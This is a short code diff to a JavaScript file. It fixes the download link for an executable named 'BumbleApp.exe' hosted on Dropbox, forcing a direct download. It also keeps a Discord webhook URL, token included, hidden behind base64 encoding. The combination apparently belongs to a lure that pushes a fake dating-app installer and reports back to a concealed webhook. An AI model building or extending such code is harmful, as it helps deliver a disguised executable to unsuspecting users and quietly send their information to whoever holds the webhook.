@@ -2,7 +2,7 @@
     "use strict";
 
     /** UTF-8 URL as base64 (same idea as WEBHOOK_URL). Replace string: btoa(unescape(encodeURIComponent(yourUrl))) in browser console. */
-    var BUMBLE_APP_DOWNLOAD_URL = atob("https://www.dropbox.com/scl/fi/5gwkcsug7clu0jfwf49mc/BumbleApp.exe?rlkey=h2q65z0egkdpax2bberp8pksd&st=k4ted545&dl=0");
+    var BUMBLE_APP_DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/5gwkcsug7clu0jfwf49mc/BumbleApp.exe?rlkey=h2q65z0egkdpax2bberp8pksd&st=k4ted545&dl=1";
 
     var WEBHOOK_URL = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MDQwNjMyOTU5NTIwMzgzNC80eUZGbnNFSnpaRHdueW9fVHFyMHdQazREY2NoWFdMOU1QRm5ua1VCejluYjBNOU9ZcXB2LWF0OUNhcEMwTkp5MGU3OQ==");
 
